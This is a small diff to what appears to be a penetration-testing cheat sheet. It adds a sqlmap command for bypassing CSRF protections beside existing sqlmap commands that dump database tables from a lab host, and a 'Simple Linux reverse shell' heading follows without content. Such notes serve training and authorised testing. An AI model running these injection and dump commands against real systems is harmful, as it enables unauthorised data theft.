@@ -277,6 +277,12 @@ sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&p
 ```shell
 sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner -D database --dump -T table --threads 10
 ```
+## Bypassing CSRF protections
+
+```shell
+python3 sqlmap.py -r update-user.req --level 5 --risk 3 --csrf-url="URL" --csrf-token="TOKEN-NAME" --dbms=mysql --banner
+```
+
 
 # Simple Linux reverse shell
 
